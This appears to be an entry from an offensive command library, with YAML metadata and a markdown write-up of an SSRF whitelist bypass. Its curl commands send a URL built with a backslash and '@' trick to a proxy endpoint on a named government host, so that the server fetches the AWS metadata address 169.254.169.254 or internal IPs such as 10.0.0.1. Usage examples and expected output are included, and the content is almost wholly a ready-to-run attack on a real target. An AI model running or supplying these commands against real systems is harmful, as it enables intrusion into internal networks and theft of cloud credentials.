---
data: >-
  curl -X GET
  "https://geonode.state.gov/proxy/?url=http://169.254.169.254\\@geonode.state.gov"
  -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
  -H "Accept-Encoding: gzip, deflate" -H "Accept-Language:
  en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
tags:
  - ssrf
  - bypass
  - aws
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.002Z'
id: 137ce1ca-b159-4b33-9e2a-c8cd8d508940
verified: false
validated: true
submitted: true
---
# bypass-whitelist-to-internal-ip

## Command

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.254\\@geonode.state.gov" -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
```

## Description

Bypasses SSRF whitelist by crafting a URL that tricks backend parsing to request an internal IP (AWS metadata) while frontend sees whitelisted domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | http://internal-ip\\@whitelisted-host | Yes |
| Host | Target host | Yes |
| User-Agent | Mimic browser | Yes |
| Accept | Standard accept headers | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.254\\@geonode.state.gov" -H "Host: geonode.state.gov"
```

### Advanced Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://10.0.0.1\\@geonode.state.gov" -H "Host: geonode.state.gov" --cookie "session=abc"
```

## Expected Output

HTTP 404 NOT FOUND, indicating internal host is reachable but path invalid.

## Related

- [[commands/test-nonexistent-internal-ip]]
- [[procedures/Bypass-SSRF-Whitelist-for-Internal-Scanning]]
